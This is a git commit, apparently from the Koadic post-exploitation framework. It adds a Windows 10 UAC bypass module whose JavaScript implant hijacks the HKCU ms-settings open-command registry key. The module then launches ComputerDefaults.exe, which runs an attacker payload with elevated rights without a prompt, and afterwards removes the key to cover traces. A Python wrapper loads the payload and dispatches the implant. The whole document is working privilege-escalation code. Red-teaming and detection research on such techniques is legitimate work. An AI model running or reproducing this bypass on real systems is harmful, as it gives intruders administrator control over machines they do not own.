ed224f035ed31f83e15564fd9d4848d9f50fa4e9
TheNaterz <nate.caroe@risksense.com>
2018-10-22 16:11:17 -0600

    added computerDefaults UAC bypass, tested on Win10

---
+++ data/implant/elevate/bypassuac_compdefaults.js
@@ -0,0 +1,24 @@
+try
+{
+    var path = 'Software\\Classes\\ms-settings\\shell\\open\\command';
+    Koadic.registry.write(Koadic.registry.HKCU, path, 'DelegateExecute', '', Koadic.registry.STRING)
+    Koadic.registry.write(Koadic.registry.HKCU, path, '', '~PAYLOAD_DATA~', Koadic.registry.STRING)
+
+    Koadic.shell.run("ComputerDefaults.exe", true);
+
+    Koadic.work.report("Completed");
+
+    var now = new Date().getTime();
+    while (new Date().getTime() < now + 10000);
+
+    if (Koadic.registry.destroy(Koadic.registry.HKCU, path, "") != 0)
+    {
+        Koadic.shell.run("reg delete HKCU\\"+path+" /f", true);
+    }
+}
+catch (e)
+{
+    Koadic.work.error(e);
+}
+
+Koadic.exit();
---
+++ modules/implant/elevate/bypassuac_compdefaults.py
@@ -0,0 +1,36 @@
+import core.job
+import core.implant
+import uuid
+
+class CompDefaultsJob(core.job.Job):
+    def done(self):
+        self.display()
+
+    def display(self):
+        self.results = "Completed"
+        #self.shell.print_plain(self.data)
+
+class CompDefaultImplant(core.implant.Implant):
+
+    NAME = "Bypass UAC CompDefaults"
+    DESCRIPTION = "Bypass UAC via registry hijack for ComputerDefaults.exe. Drops no files to disk."
+    AUTHORS = ["TheNaterz", "st0rnpentest"]
+
+    def load(self):
+        self.options.register("PAYLOAD", "", "run listeners for a list of IDs")
+        self.options.register("PAYLOAD_DATA", "", "the actual data", hidden=True)
+
+    def run(self):
+        id = self.options.get("PAYLOAD")
+        payload = self.load_payload(id)
+
+        if payload is None:
+            self.shell.print_error("Payload %s not found." % id)
+            return
+
+        self.options.set("PAYLOAD_DATA", payload)
+
+        workloads = {}
+        workloads["js"] = self.loader.load_script("data/implant/elevate/bypassuac_compdefaults.js", self.options)
+
+        self.dispatch(workloads, CompDefaultsJob)
